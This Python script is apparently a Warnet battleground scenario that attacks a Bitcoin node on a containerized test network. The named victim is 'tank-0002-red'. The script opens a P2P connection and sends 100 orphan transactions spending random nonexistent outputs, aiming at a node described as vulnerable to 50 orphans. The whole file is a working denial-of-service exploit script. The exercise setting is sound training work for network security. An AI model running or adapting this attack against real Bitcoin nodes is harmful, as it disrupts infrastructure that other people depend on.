#!/usr/bin/env python3

import random
import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    hash256,
    msg_tx,
    CTransaction,
    CTxOut,
    CTxIn,
    COutPoint
)
from test_framework.script import CScript
from test_framework.p2p import MAGIC_BYTES, P2PInterface

def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Orphan50(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate orphan attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/stub_orphan.py"

    # Scenario entrypoint
    def run_test(self):
        self.log.info("Starting orphan scenario")

        # We pick a node on the network to attack
        # We know this one is vulnderable to 50 orphans based on it's subver
        # Change this to your teams colour if running in the battleground
        victim = "tank-0002-red.default.svc"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)


        for i in range(100):
            # make a transaction that spends an output that doesn't exist
            tx = CTransaction()
            tx.vout.append(CTxOut(100000000, CScript(bytes.fromhex('0014' + ('00' * 20)))))
            tx.vin.append(CTxIn(COutPoint(random.randint(1, int(1e64)), 0)))
            tx.calc_sha256()

            print(tx.serialize().hex())

            # send the orphan, perhaps like this:
            attacker.send_and_ping(msg_tx(tx))

            self.log.info(f"Sent orphan {i+1} of 100")


def main():
    Orphan50().main()


if __name__ == "__main__":
    main()
